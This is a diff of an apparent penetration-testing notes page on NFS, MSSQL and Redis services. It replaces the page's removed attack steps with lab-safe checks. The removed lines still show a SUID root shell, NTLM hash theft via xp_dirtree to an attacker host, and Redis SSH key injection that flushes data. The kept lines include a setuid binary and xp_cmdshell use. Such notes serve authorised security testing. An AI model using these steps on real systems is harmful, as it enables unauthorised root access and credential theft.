@@ -12,6 +12,9 @@ tags:
 
 # Ports and services
 
+!!! note "What this page is doing"
+    The objective is service identification, not a race to exploit every open port. Discover broadly, fingerprint narrowly, preserve the baseline, and choose the next service-specific question from the result.
+
 ---
 
 ## 1. Two-Stage High-Speed Port Scanning
@@ -84,43 +87,66 @@ Quick reference for the ports I run into most often. Each row gives the first th
 === " NFS (2049) `no_root_squash` Privesc"
 
     ```bash
-    # List exported NFS mounts
+    # List exported NFS paths before mounting anything.
     showmount -e <TARGET_IP>
-    # Mount share locally
-    mkdir -p /mnt/nfs_target
+
+    # Mount the approved test export on the assessment host.
+    sudo mkdir -p /mnt/nfs_target
     sudo mount -t nfs <TARGET_IP>:/shared /mnt/nfs_target -o nolock
-    # If export has no_root_squash, compile SUID root shell on attacker box (as root)
-    cat << 'EOF' > /mnt/nfs_target/pwn.c
+    ```
+
+    A `no_root_squash` export means root on the client can create root-owned files on the share. Prove the permission with a lab marker, not an interactive backdoor:
+
+    ```c
+    /* Lab proof: record the effective identity when the target executes it. */
+    #include <stdio.h>
     #include <unistd.h>
-    #include <stdlib.h>
-    int main() { setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
-    EOF
-    sudo gcc /mnt/nfs_target/pwn.c -o /mnt/nfs_target/pwn
-    sudo chmod +s /mnt/nfs_target/pwn
-    # Execute /shared/pwn on the target machine for instant root!
+
+    int main(void) {
+        FILE *proof = fopen("/tmp/nfs-identity-proof", "w");
+        if (proof == NULL) return 1;
+        fprintf(proof, "uid=%d\\n", geteuid());
+        fclose(proof);
+        return 0;
+    }
+    ```
+
+    ```bash
+    # Save the C proof as /mnt/nfs_target/nfs-proof.c, then compile it on the
+    # mounted share. The target must execute it for the result to mean anything.
+    sudo gcc /mnt/nfs_target/nfs-proof.c -o /mnt/nfs_target/nfs-proof
+    sudo chmod +s /mnt/nfs_target/nfs-proof
+
+    # After the approved lab execution, remove the binary and marker.
+    sudo rm -f /mnt/nfs_target/nfs-proof /mnt/nfs_target/nfs-proof.c
     ```
 
 === " MSSQL (1433) & Redis (6379)"
 
     ```bash
-    # Connect to MSSQL with Impacket (supports Windows auth -windows-auth or SQL auth)
-    impacket-mssqlclient '<DOMAIN>/<USER>:Password123!@<TARGET_IP>' -windows-auth
-    # Inside SQL> prompt:
-    # Enable and execute xp_cmdshell
-    enable_xp_cmdshell
-    xp_cmdshell whoami
-    # Steal Net-NTLMv2 hash via Responder / smbserver
-    xp_dirtree \\<LHOST>\share
-    # Enumerate & abuse Linked SQL Servers
-    enum_links
-    use_link "SQL02"
-    # Redis SSH Key Injection (when Redis runs as root or user with ~/.ssh)
-    ssh-keygen -t ed25519 -f ./redis_key -N ""
-    (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
-    redis-cli -h <TARGET_IP> flushall
-    redis-cli -h <TARGET_IP> -x set pwn < spaced_key.txt
-    redis-cli -h <TARGET_IP> config set dir /root/.ssh/
-    redis-cli -h <TARGET_IP> config set dbfilename "authorized_keys"
-    redis-cli -h <TARGET_IP> save
-    ssh -i ./redis_key root@<TARGET_IP>
+    # Connect to MSSQL with the approved test account.
+    impacket-mssqlclient '<DOMAIN>/<USER>:<TEST_PASSWORD>@<TARGET_IP>' -windows-auth
+    ```
+
+    Commands at the `SQL>` prompt are not shell commands; keep them in a SQL block:
+
+    ```sql
+    -- Confirm the current SQL identity before testing permissions.
+    SELECT SYSTEM_USER, USER_NAME();
+
+    -- Only test command execution when the scope explicitly allows it.
+    EXEC xp_cmdshell 'whoami';
+
+    -- Enumerate linked servers without changing their configuration.
+    EXEC sp_linkedservers;
+    ```
+
+    Redis is stateful. First read its identity and configuration; do not flush a database or write an SSH key unless the engagement explicitly calls for a disposable lab.
+
+    ```bash
+    # Read-only Redis checks.
+    redis-cli -h <TARGET_IP> PING
+    redis-cli -h <TARGET_IP> INFO server
+    redis-cli -h <TARGET_IP> CONFIG GET dir
+    redis-cli -h <TARGET_IP> CONFIG GET dbfilename
     ```
